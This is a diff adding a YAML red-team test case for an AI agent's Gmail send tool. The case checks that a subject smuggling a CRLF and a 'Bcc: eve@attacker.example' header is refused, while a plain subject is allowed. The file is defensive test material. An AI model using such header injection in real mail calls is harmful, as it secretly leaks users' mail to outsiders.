@@ -1,0 +1,46 @@
+apiVersion: pantherclaw.range/v1
+id: RT-211
+title: A line break in a mail subject never adds a header to the message the gateway builds
+category: boundary
+suite: platform
+tier: business
+attacker: A1
+threats: [T-333]
+rules: [HR-724, HR-075]
+atlas: [AML.T0053]
+technique_why:
+  AML.T0053: "AI agent tool invocation (AML.T0053): the agent calls its own Gmail send tool with a crafted subject."
+requires: [gmail.send]
+# On a live range this would send real mail.
+harness_only: true
+steps:
+  # The subject carries CRLF and a Bcc line: the request is refused before
+  # anything is decided or minted.
+  - id: injected-subject
+    do: agent.call
+    with:
+      face: mcp
+      connection: gmail
+      tool: gmail_send_message
+      args:
+        mailbox: "${fixture.mailbox}"
+        to: ["bob@example.test"]
+        subject: "Hi\r\nBcc: eve@attacker.example"
+        text: "rt-211-${fixture.nonce}"
+    expect:
+      outcome: REFUSED
+      code: invalid_arguments
+  # The same send with a plain subject goes through.
+  - id: plain-subject
+    do: agent.call
+    with:
+      face: mcp
+      connection: gmail
+      tool: gmail_send_message
+      args:
+        mailbox: "${fixture.mailbox}"
+        to: ["bob@example.test"]
+        subject: "Retries fixed"
+        text: "rt-211-${fixture.nonce}"
+    expect:
+      outcome: ALLOW
